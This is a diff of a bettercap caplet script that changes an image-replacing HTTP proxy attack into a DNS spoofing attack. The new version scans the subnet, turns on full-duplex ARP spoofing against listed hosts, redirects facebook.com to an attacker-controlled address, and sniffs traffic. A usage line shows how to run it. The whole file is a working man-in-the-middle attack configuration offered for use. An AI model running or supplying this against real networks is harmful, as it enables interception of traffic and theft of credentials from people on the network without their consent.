@@ -1,22 +1,23 @@
 # usage:
-# sudo ./bettercap -caplet replace-images.cap -eval "set arp.spoof.targets 192.168.1.64"
+# sudo ./bettercap -caplet dns-spoof.cap -eval "set arp.spoof.targets 192.168.3.2, 192.168.3.1"
 
 # detect all devices in subnet:
+net.recon on
 net.probe on
 sleep 5
 net.probe off
 net.recon off
 
-# replace all imgages in html-source:
-set http.proxy.script replace-images.js
+set arp.spoof.targets 192.168.3.2, 192.168.3.1
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
 
-# redirect http & https traffic to a proxy:
-http.proxy on
-https.proxy on
-sleep 1
+set dns.spoof.domains facebook.com
+set dns.spoof.address 192.168.3.2
+set net.sniff.verbose false
 
-# configure arp.spoofing:
-# set arp.spoof.internal true
-# set arp.spoof.fullduplex true
-# set arp.spoof.targets 172.16.0.1, 172.16.0.15
-# arp.spoof on
+set net.sniff.verbose true
+net.sniff on
+dns.spoof on
+arp.spoof on
+
